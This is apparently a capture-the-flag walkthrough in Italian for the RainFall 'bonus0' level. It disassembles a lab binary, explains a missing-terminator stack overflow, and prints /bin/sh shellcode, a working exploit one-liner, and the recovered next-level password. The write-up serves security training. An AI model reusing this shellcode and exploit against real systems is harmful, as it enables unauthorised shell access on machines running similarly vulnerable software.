# Bonus 0
Controlliamo le stringhe presenti nel binario:
```
bonus0@RainFall:~$ readelf -p '.rodata' bonus0

String dump of section '.rodata':
  [     8]   -
  [     c]
```
Nulla di interessante purtroppo, quindi passiamo a `gdb`:
```
bonus0@RainFall:~$ gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  read
0x08048380  read@plt
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
0x080483b0  puts
0x080483b0  puts@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  strchr
0x080483d0  strchr@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  strncpy
0x080483f0  strncpy@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080484b4  p
0x0804851e  pp
0x080485a4  main
0x080485d0  __libc_csu_init
0x08048640  __libc_csu_fini
0x08048642  __i686.get_pc_thunk.bx
0x08048650  __do_global_ctors_aux
0x0804867c  _fini
```

### Funzione `main`
```
(gdb) disass main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.
```
Riserva 0x40 (64) byte di spazio nello stack e chiama la funzione `pp`
passandogli come argomento un puntatore ad un array da 42 byte, successivamente
chiama la funzione `puts` per stampare l'array.

### Funzione `pp`
```
(gdb) disass pp
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   %ebp
   0x0804851f <+1>:     mov    %esp,%ebp
   0x08048521 <+3>:     push   %edi
   0x08048522 <+4>:     push   %ebx
   0x08048523 <+5>:     sub    $0x50,%esp
   0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:    lea    -0x30(%ebp),%eax
   0x08048531 <+19>:    mov    %eax,(%esp)
   0x08048534 <+22>:    call   0x80484b4 <p>
   0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:    mov    %eax,(%esp)
   0x08048547 <+41>:    call   0x80484b4 <p>
   0x0804854c <+46>:    lea    -0x30(%ebp),%eax
   0x0804854f <+49>:    mov    %eax,0x4(%esp)
   0x08048553 <+53>:    mov    0x8(%ebp),%eax
   0x08048556 <+56>:    mov    %eax,(%esp)
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:    mov    $0x80486a4,%ebx
   0x08048563 <+69>:    mov    0x8(%ebp),%eax
   0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:    mov    %eax,%edx
   0x0804856f <+81>:    mov    $0x0,%eax
   0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:    mov    %edx,%edi
   0x08048579 <+91>:    repnz scas %es:(%edi),%al
   0x0804857b <+93>:    mov    %ecx,%eax
   0x0804857d <+95>:    not    %eax
   0x0804857f <+97>:    sub    $0x1,%eax
   0x08048582 <+100>:   add    0x8(%ebp),%eax
   0x08048585 <+103>:   movzwl (%ebx),%edx
   0x08048588 <+106>:   mov    %dx,(%eax)
   0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:   mov    %eax,0x4(%esp)
   0x08048592 <+116>:   mov    0x8(%ebp),%eax
   0x08048595 <+119>:   mov    %eax,(%esp)
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
   0x0804859d <+127>:   add    $0x50,%esp
   0x080485a0 <+130>:   pop    %ebx
   0x080485a1 <+131>:   pop    %edi
   0x080485a2 <+132>:   pop    %ebp
   0x080485a3 <+133>:   ret
End of assembler dump.
```
Riserva 0x50 (80) byte nello stack per due array usati come appoggio 
per le stringhe e un int usato per memorizzare la lunghezza di una delle 
stringhe.
Successivamente chiama per due volte la funzione `p` passandogli prima il primo
array e poi il secondo e come secondo argomento la stringa `" - "`.
Poi chiama `strcpy` per copiare nella stringa passata come argomento il primo 
array, calcola la lunghezza e aggiunge il carattere spazio alla fine,
per poi concatenare la stringa con il secondo array.

### Funzione `p`
```
(gdb) disass p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp
   0x080484bd <+9>:     mov    0xc(%ebp),%eax
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
   0x080484da <+38>:    movl   $0x0,(%esp)
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    movb   $0x0,(%eax)
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:    movl   $0x14,0x8(%esp)
   0x0804850d <+89>:    mov    %eax,0x4(%esp)
   0x08048511 <+93>:    mov    0x8(%ebp),%eax
   0x08048514 <+96>:    mov    %eax,(%esp)
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
```
Riserva 0x1018 (4120) byte di spazio nello stack, chiama `puts` per stampare il
secondo argomento della funzione, poi `read` leggendo `4096` byte dallo `stdin`,
e con `strchr` cerca il carattere `\n` per poi sostituirlo con il carattere `0`,
per poi copiare con `strncpy` il buffer letto da `read` nella stringa passata come
primo argomento della funzione.

### Soluzione
La funzione `strncpy` usata in `p` copia solo 20 byte, dunque se inviamo una stringa
più lunga nel primo `read`, non avremo il carattere `0` a terminare la stringa e lo stesso
vale per la seconda chiamata a `read` così da non avere nessuno terminatore nel buffer e
causare un `buffer overflow` nella successiva chiamata a `strcpy`.
Dunque ora troviamo l'offset per sovrascrivere il puntatore in `eip` tramite il sito [Buffer Overflow EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/):
```
bonus0@RainFall:~$ gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 -
012345678901234567890
Aa0Aa1Aa2Aa3Aa4Aa5Aa01234567890123456789��� 01234567890123456789���

Program received signal SIGSEGV, Segmentation fault.
0x32313039 in ?? ()
```
La seconda stringa sovrascrive l'eip e si trova ad un offset di 9,
quindi il nostro buffer finale dovrà essere:
```
| str2 | str1 |
    ^      ^
    |      |-----> | shellcode |
    |----> | A*9 | indirizzo + buffer + offset shellcode | B*7 | 
```
L'indirizzo del buffer (`0xbfffe670`) lo troviamo nel seguente modo:
```
bonus0@RainFall:~$ gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) disass p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp
   0x080484bd <+9>:     mov    0xc(%ebp),%eax
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
   0x080484da <+38>:    movl   $0x0,(%esp)
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    movb   $0x0,(%eax)
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:    movl   $0x14,0x8(%esp)
   0x0804850d <+89>:    mov    %eax,0x4(%esp)
   0x08048511 <+93>:    mov    0x8(%ebp),%eax
   0x08048514 <+96>:    mov    %eax,(%esp)
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
(gdb) b *0x080484d6
Breakpoint 1 at 0x80484d6
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484d6 in p ()
(gdb) x /x $ebp-0x1008
0xbfffe670:     0x00000000
```
Shellcode (asm):
```asm
section .text
global _start

_start:
  xor  eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f
  mov  ebx, esp
  push eax
  push ebx
  mov  ecx, esp
  xor  edx, edx
  mov  al, 11
  and  esp, 0xfffffff0
  int  0x80
```

Shellcode (opcode):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80
```

Dunque ora non resta che creare l'exploit ed eseguire:
```
bonus0@RainFall:~$ (python -c 'print "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80"'; python -c 'print "A"*9 + "\xc0\xe6\xff\xbf" + "B"*7' ; cat) | ./bonus0
 -
 -
��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
exit
exit
bonus0@RainFall:~$ su bonus1
Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
bonus1@RainFall:~$
```